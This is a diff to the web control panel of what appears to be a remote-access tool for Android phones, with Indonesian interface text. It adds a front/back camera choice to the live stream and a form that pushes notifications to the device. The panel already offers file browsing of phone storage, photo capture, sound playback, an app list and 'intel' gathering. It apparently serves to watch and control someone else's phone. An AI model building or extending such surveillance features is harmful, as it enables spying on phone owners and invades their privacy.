@@ -409,10 +409,16 @@
             <div class="card p-4">
                 <div class="flex items-center justify-between mb-3">
                     <p class="text-sm font-black text-white">Live Stream (MJPEG)</p>
-                    <button @click="startStream()" :class="streaming ? 'badge-red' : 'badge-green'"
-                        class="badge cursor-pointer">
-                        <span x-text="streaming ? '⏹ STOP' : '▶ LIVE'"></span>
-                    </button>
+                    <div class="flex gap-1.5">
+                        <select x-model="streamFacing" :disabled="streaming" class="bg-[#0a0f1c] text-[10px] font-bold text-slate-400 border border-slate-800 rounded-md px-2 outline-none">
+                            <option value="back">Back Cam</option>
+                            <option value="front">Front Cam</option>
+                        </select>
+                        <button @click="startStream()" :class="streaming ? 'badge-red' : 'badge-green'"
+                            class="badge cursor-pointer">
+                            <span x-text="streaming ? '⏹ STOP' : '▶ LIVE'"></span>
+                        </button>
+                    </div>
                 </div>
                 <div class="rounded-xl overflow-hidden"
                     style="background:#000;border:1px solid #1a2535;min-height:180px">
@@ -482,6 +488,18 @@
                     </svg>
                     <span class="text-[10px] font-bold text-slate-400">Sensor</span>
                 </button>
+            </div>
+
+            <!-- Push Notify Form -->
+            <div class="card-sm p-3 mb-3">
+                <p class="text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-2">Push Notification</p>
+                <div class="space-y-2">
+                    <input type="text" x-model="notifyTitle" placeholder="Judul Notifikasi" class="input-field text-sm py-2">
+                    <div class="flex gap-2">
+                        <input type="text" x-model="notifyText" placeholder="Isi pesan..." class="input-field text-sm py-2">
+                        <button @click="exec('notify', notifyTitle + '|' + notifyText)" class="btn-primary px-4 py-2 shrink-0">Push</button>
+                    </div>
+                </div>
             </div>
 
             <!-- Loading -->
@@ -740,6 +758,7 @@
                 currentPath: "/storage/emulated/0", files: [], loadingFiles: false,
                 toastText: "", selectedUploadFile: null, uploading: false,
                 photoSrc: null, photoLoading: false, streaming: false, streamSrc: "",
+                streamFacing: "back", notifyTitle: "", notifyText: "",
                 ttsText: "", playSoundUrl: "",
                 intelData: [], intelResult: "", intelLoading: false,
                 appList: [], appPkg: "", appLoading: false,
@@ -844,7 +863,7 @@
                 },
                 startStream() {
                     if (this.streaming) { this.streaming = false; this.streamSrc = ""; }
-                    else { this.streamSrc = "/stream?t=" + Date.now(); this.streaming = true; }
+                    else { this.streamSrc = "/stream?facing=" + this.streamFacing + "&t=" + Date.now(); this.streaming = true; }
                 },
                 async fetchData(cmd) {
                     this.intelData = []; this.intelResult = ""; this.intelLoading = true;
